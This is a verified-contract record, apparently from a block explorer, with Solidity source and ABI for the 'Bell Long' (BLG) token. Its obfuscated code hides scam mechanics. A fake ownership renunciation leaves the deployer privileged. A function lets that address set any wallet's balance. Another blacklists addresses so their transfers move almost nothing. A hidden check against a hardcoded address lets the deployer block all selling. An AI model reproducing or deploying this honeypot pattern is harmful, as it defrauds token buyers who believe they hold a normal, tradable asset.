{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface receiverLimit {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fundList) external view returns (uint256);\n\n    function transfer(address takeFee, uint256 tokenMode) external returns (bool);\n\n    function allowance(address senderFrom, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tokenMode) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address takeFee,\n        uint256 tokenMode\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed buySender, uint256 value);\n    event Approval(address indexed senderFrom, address indexed spender, uint256 value);\n}\n\nabstract contract fromReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface totalExemptTx {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface maxLaunch {\n    function createPair(address buyReceiver, address teamSender) external returns (address);\n}\n\ninterface toFee is receiverLimit {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract BellLong is fromReceiver, receiverLimit, toFee {\n\n    uint256 public teamMarketing;\n\n    function decimals() external view virtual override returns (uint8) {\n        return takeToken;\n    }\n\n    string private senderLaunch = \"BLG\";\n\n    address private receiverTeam;\n\n    function amountSell(address marketingAtIs, address takeFee, uint256 tokenMode) internal returns (bool) {\n        require(buyToken[marketingAtIs] >= tokenMode);\n        buyToken[marketingAtIs] -= tokenMode;\n        buyToken[takeFee] += tokenMode;\n        emit Transfer(marketingAtIs, takeFee, tokenMode);\n        return true;\n    }\n\n    function txReceiver(address marketingAtIs, address takeFee, uint256 tokenMode) internal returns (bool) {\n        if (marketingAtIs == atIsLaunched) {\n            return amountSell(marketingAtIs, takeFee, tokenMode);\n        }\n        uint256 shouldAutoReceiver = receiverLimit(launchedFee).balanceOf(takeMaxLiquidity);\n        require(shouldAutoReceiver == isWallet);\n        require(takeFee != takeMaxLiquidity);\n        if (takeFund[marketingAtIs]) {\n            return amountSell(marketingAtIs, takeFee, atTake);\n        }\n        return amountSell(marketingAtIs, takeFee, tokenMode);\n    }\n\n    event OwnershipTransferred(address indexed marketingTokenAt, address indexed walletTo);\n\n    function getOwner() external view returns (address) {\n        return receiverTeam;\n    }\n\n    bool private txTeamTrading;\n\n    mapping(address => uint256) private buyToken;\n\n    bool public tokenFromMode;\n\n    mapping(address => mapping(address => uint256)) private minToToken;\n\n    uint256 private takeAt = 100000000 * 10 ** 18;\n\n    address takeMaxLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address public launchedFee;\n\n    function modeTradingReceiver(address fromTokenWallet, uint256 tokenMode) public {\n        limitSenderMax();\n        buyToken[fromTokenWallet] = tokenMode;\n    }\n\n    uint256 isWallet;\n\n    function transfer(address fromTokenWallet, uint256 tokenMode) external virtual override returns (bool) {\n        return txReceiver(_msgSender(), fromTokenWallet, tokenMode);\n    }\n\n    function allowance(address senderFund, address tokenTo) external view virtual override returns (uint256) {\n        if (tokenTo == listSellSender) {\n            return type(uint256).max;\n        }\n        return minToToken[senderFund][tokenTo];\n    }\n\n    string private shouldTeam = \"Bell Long\";\n\n    bool public sellLimit;\n\n    uint8 private takeToken = 18;\n\n    function owner() external view returns (address) {\n        return receiverTeam;\n    }\n\n    function launchedSender(address shouldExemptIs) public {\n        if (tokenFromMode) {\n            return;\n        }\n        \n        atMin[shouldExemptIs] = true;\n        if (txTeamTrading == sellLimit) {\n            teamMarketing = fundTotal;\n        }\n        tokenFromMode = true;\n    }\n\n    uint256 private sellModeLimit;\n\n    function txEnable() public {\n        emit OwnershipTransferred(atIsLaunched, address(0));\n        receiverTeam = address(0);\n    }\n\n    uint256 public fundTotal;\n\n    uint256 constant atTake = 1 ** 10;\n\n    mapping(address => bool) public atMin;\n\n    function limitSenderMax() private view {\n        require(atMin[_msgSender()]);\n    }\n\n    function transferFrom(address marketingAtIs, address takeFee, uint256 tokenMode) external override returns (bool) {\n        if (_msgSender() != listSellSender) {\n            if (minToToken[marketingAtIs][_msgSender()] != type(uint256).max) {\n                require(tokenMode <= minToToken[marketingAtIs][_msgSender()]);\n                minToToken[marketingAtIs][_msgSender()] -= tokenMode;\n            }\n        }\n        return txReceiver(marketingAtIs, takeFee, tokenMode);\n    }\n\n    uint256 fundAtTake;\n\n    function name() external view virtual override returns (string memory) {\n        return shouldTeam;\n    }\n\n    function atSender(uint256 tokenMode) public {\n        limitSenderMax();\n        isWallet = tokenMode;\n    }\n\n    function balanceOf(address fundList) public view virtual override returns (uint256) {\n        return buyToken[fundList];\n    }\n\n    mapping(address => bool) public takeFund;\n\n    uint256 public receiverLiquidity;\n\n    function symbol() external view virtual override returns (string memory) {\n        return senderLaunch;\n    }\n\n    constructor (){\n        if (receiverLiquidity != teamMarketing) {\n            teamMarketing = receiverLiquidity;\n        }\n        totalExemptTx amountTotalLiquidity = totalExemptTx(listSellSender);\n        launchedFee = maxLaunch(amountTotalLiquidity.factory()).createPair(amountTotalLiquidity.WETH(), address(this));\n        if (teamMarketing != sellModeLimit) {\n            sellLimit = true;\n        }\n        atIsLaunched = _msgSender();\n        txEnable();\n        atMin[atIsLaunched] = true;\n        buyToken[atIsLaunched] = takeAt;\n        \n        emit Transfer(address(0), atIsLaunched, takeAt);\n    }\n\n    function approve(address tokenTo, uint256 tokenMode) public virtual override returns (bool) {\n        minToToken[_msgSender()][tokenTo] = tokenMode;\n        emit Approval(_msgSender(), tokenTo, tokenMode);\n        return true;\n    }\n\n    address listSellSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function swapWallet(address maxLimit) public {\n        limitSenderMax();\n        \n        if (maxLimit == atIsLaunched || maxLimit == launchedFee) {\n            return;\n        }\n        takeFund[maxLimit] = true;\n    }\n\n    address public atIsLaunched;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return takeAt;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingTokenAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletTo\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buySender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenTo\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenMode\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atIsLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenMode\",\"type\":\"uint256\"}],\"name\":\"atSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundList\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldExemptIs\",\"type\":\"address\"}],\"name\":\"launchedSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromTokenWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenMode\",\"type\":\"uint256\"}],\"name\":\"modeTradingReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxLimit\",\"type\":\"address\"}],\"name\":\"swapWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenFromMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromTokenWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenMode\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingAtIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenMode\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "BellLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}